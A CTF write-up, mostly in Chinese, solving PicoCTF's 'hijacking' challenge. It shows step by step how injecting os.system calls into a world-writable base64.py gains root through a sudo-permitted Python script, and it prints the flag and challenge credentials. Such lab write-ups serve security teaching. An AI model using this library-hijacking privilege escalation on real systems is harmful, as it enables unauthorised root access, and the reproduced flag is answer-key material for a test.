---
title: PicoCTF - hijacking
tags: [PicoCTF, CTF, PWN]

category: "Security｜Practice｜PicoCTF｜PWN"
---

# PicoCTF - hijacking
<!-- more -->

## Background
Privilege Escalation

Hint 1: Check for Hidden files
Hint 2: No place like Home:)

---
[Linux sudo命令](https://www.runoob.com/linux/linux-comm-sudo.html)
> -l 顯示出自己（執行 sudo 的使用者）的權限

## Recon
第一次遇到提權的問題，感覺很新鮮也很好玩，不過因為沒啥概念所以主要是參考[^pico_pwn_hijacking_wp_martin]
1. 首先觀察一下各個file或folders，根目錄有個challenge folder，另外家目錄有一個.server.py檔案，裡面的內容不太重要，只需要知道他import哪些library
2. 現在的問題是按照目前的權限，無法讀取challenge相關的資訊，所以我們要提升權限，主要的做法是利用base64.py這個mod全開的檔案進行讀寫，再利用python執行有import base64的.server.py檔案就可以執行shell
3. 為神麼要用base64.py當作主要的突破口就是因為只有他的mod全開
    ```bash
    $ ls -al /usr/lib/python3.8
    ...
    -rwxrwxrwx 1 root root  20382 Nov 14  2022 base64.py
    ...
    -rw-r--r-- 1 root root  38995 Nov 14  2022 os.py
    ...
    -rw-r--r-- 1 root root  35243 Nov 14  2022 socket.py
    ```

## Exploit
```bash
$ ssh picoctf@saturn.picoctf.net -p 58219
$ find / -name "base64.py"
...
/usr/lib/python3.8/base64.py
...
$ vim /usr/lib/python3.8/base64.py
# add these line and save the file
import os
os.system('ls -al /challenge')
$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
$ sudo /usr/bin/python3 /home/picoctf/.server.py
total 4
d--------- 1 root root   6 Mar 16 02:08 .
drwxr-xr-x 1 root root  51 Jul 31 15:23 ..
-rw-r--r-- 1 root root 103 Mar 16 02:08 metadata.json
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
$ vim /usr/lib/python3.8/base64.py
# revise the file
os.system('cat /challegne/metadata.json')
$ sudo /usr/bin/python3 /home/picoctf/.server.py
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}", "username": "picoctf", "password": "HYGhWsmPyf"}sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
```

Flag: `picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}`

## Reference
[^pico_pwn_hijacking_wp_martin]:[ picoCTF 2023 hijacking ](https://youtu.be/BIzu0AtOq5w)